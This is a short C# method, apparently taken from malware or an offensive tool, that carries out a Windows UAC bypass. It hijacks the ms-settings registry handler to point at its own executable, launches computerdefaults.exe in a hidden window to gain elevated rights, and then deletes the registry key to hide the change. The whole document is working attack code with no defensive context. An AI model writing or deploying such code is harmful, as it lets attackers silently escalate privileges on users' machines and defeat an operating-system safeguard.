    public static object bypassR() //dont skidding plz (:
    {
        try
        {
            Program.Z("Classes");
            Program.Z("Classes\\ms-settings");
            Program.Z("Classes\\ms-settings\\shell");
            Program.Z("Classes\\ms-settings\\shell\\open");
            RegistryKey registryKey = Program.Z("Classes\\ms-settings\\shell\\open\\command");
            string value = "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"";
            registryKey.SetValue("", value, RegistryValueKind.String);
            registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
            registryKey.Close();
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    FileName = "cmd.exe",
                    Arguments = "/c start computerdefaults.exe && powershell.exe Remove-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell -Recurse"
                });
            }
            catch (Exception ex)
            {
            }
            Environment.Exit(Environment.ExitCode);
        }
        catch (Exception ex2)
        {
        }
        object result;
        return result;
    }
```
